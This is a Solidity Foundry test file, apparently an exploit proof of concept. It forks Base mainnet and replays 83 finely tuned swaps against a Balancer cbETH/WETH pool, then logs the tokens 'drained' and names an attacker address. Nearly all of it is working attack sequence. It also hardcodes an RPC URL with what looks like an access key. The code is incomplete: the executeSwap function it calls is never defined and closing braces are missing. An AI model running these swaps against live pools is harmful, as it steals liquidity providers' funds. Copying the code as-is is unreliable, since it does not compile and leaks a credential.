// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        address assetIn;
        address assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external returns (uint256);

    function getPoolTokens(bytes32 poolId) external view returns (
        address[] memory tokens,
        uint256[] memory balances,
        uint256 lastChangeBlock
    );
}

contract BalancerBaseCbEthWethPoolTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    bytes32 constant POOL_ID = 0xfb4c2e6e6e27b5b4a07a36360c89ede29bb3c9b6000000000000000000000026;
    address constant BASE_CBETH_WETH_BPT = 0xFb4C2E6E6e27B5b4a07a36360C89EDE29bB3c9B6;
    address constant BASE_cbETH = 0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22;  // Index 0
    address constant BASE_WETH = 0x4200000000000000000000000000000000000006;   // Index 1
    address constant BASE_ATTACKER = 0x56e5Adab68b594B0c2aD6C112D94AE5aCA98A001;

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;
        uint256 expectedIn;
        uint256 indexIn;
        uint256 indexOut;
    }

    function testBaseCbEthWethPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.base-mainnet.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            37683370
        );

        // Get initial pool state
        (address[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(POOL_ID);

        console.log("INITIAL STATE:");
        console.log("  cbETH balance:", balances[0] / 1e18, "cbETH");
        console.log("  WETH balance:", balances[1] / 1e18, "WETH");
        console.log("  BPT balance:", balances[2] / 1e18, "BPT");
        console.log("");

        // 83 exact swaps with GIVEN_OUT
        ExactSwapData[83] memory swaps;

        swaps[0] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_cbETH,
            amount: 1365243844597280,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });
        swaps[1] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_WETH,
            amount: 69170277286762,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });
        swaps[2] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_cbETH,
            amount: 13652438445972,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });
        swaps[3] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_WETH,
            amount: 691702772868,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });
        swaps[4] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_cbETH,
            amount: 136524384460,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });
        swaps[5] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_WETH,
            amount: 6917027729,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });
        swaps[6] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_cbETH,
            amount: 1365243845,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });
        swaps[7] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_WETH,
            amount: 69170277,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });
        swaps[8] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_cbETH,
            amount: 13652438,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });
        swaps[9] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_WETH,
            amount: 691703,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });
        swaps[10] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_cbETH,
            amount: 136524,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });
        swaps[11] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_WETH,
            amount: 6917,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });
        swaps[12] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_cbETH,
            amount: 1366,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });
        swaps[13] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_WETH,
            amount: 70,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });
        swaps[14] = ExactSwapData({
            tokenIn: BASE_CBETH_WETH_BPT,
            tokenOut: BASE_cbETH,
            amount: 14,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });
        swaps[15] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 99999999991,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[16] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[17] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 350000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[18] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 17509,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[19] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[20] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 250000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[21] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 36561485731,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[22] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[23] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 180000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[24] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 14969203,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[25] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[26] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 130000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[27] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 6211,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[28] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[29] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 93000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[30] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 15848,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[31] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[32] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 66000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[33] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 41327,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[34] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[35] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 47000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[36] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 39095,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[37] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[38] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 33000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[39] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 1298,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[40] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[41] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 24000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[42] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 147200,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[43] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[44] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 17000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[45] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 508,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[46] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[47] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 12000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[48] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 381,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[49] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[50] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 8900000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[51] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 37430,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[52] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[53] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 6300000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[54] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 10457,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[55] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[56] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 4500000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[57] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 23272,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[58] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[59] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 3200000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[60] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 7258,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[61] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[62] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 2300000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[63] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 11026,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[64] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[65] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 1600000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[66] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 875,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[67] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[68] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 1100000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[69] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 211,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[70] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[71] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 840000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[72] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 1459544227,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[73] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_cbETH,
            amount: 8,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });
        swaps[74] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_WETH,
            amount: 600000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });
        swaps[75] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_CBETH_WETH_BPT,
            amount: 10000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });
        swaps[76] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_CBETH_WETH_BPT,
            amount: 10000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });
        swaps[77] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_CBETH_WETH_BPT,
            amount: 10000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });
        swaps[78] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_CBETH_WETH_BPT,
            amount: 10000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });
        swaps[79] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_CBETH_WETH_BPT,
            amount: 10000000000000000,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });
        swaps[80] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_CBETH_WETH_BPT,
            amount: 10000000000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });
        swaps[81] = ExactSwapData({
            tokenIn: BASE_cbETH,
            tokenOut: BASE_CBETH_WETH_BPT,
            amount: 699912987443483374,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });
        swaps[82] = ExactSwapData({
            tokenIn: BASE_WETH,
            tokenOut: BASE_CBETH_WETH_BPT,
            amount: 699912987443483374,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        // Execute all swaps
        uint256 successfulSwaps = 0;
        uint256 failedSwaps = 0;

        for (uint256 i = 0; i < swaps.length; i++) {
            try this.executeSwap(swaps[i]) {
                successfulSwaps++;
            } catch Error(string memory reason) {
                failedSwaps++;
                if (i == 0) {
                    console.log("First swap failed with reason:", reason);
                }
            } catch {
                failedSwaps++;
            }
        }

        console.log("SWAP EXECUTION RESULTS:");
        console.log("  Total swaps:", swaps.length);

        // Get final pool state
        (, uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID);

        console.log("FINAL STATE:");
        console.log("  cbETH balance:", finalBalances[0] / 1e18, "cbETH");
        console.log("  WETH balance:", finalBalances[1] / 1e18, "WETH");
        console.log("  BPT balance:", finalBalances[2] / 1e18, "BPT");
        console.log("");

        if (successfulSwaps > 0) {

            console.log("  cbETH drained:", (balances[0] - finalBalances[0]) / 1e18, "cbETH");
            console.log("  WETH drained:", (balances[1] - finalBalances[1]) / 1e18, "WETH");
    }
    
}
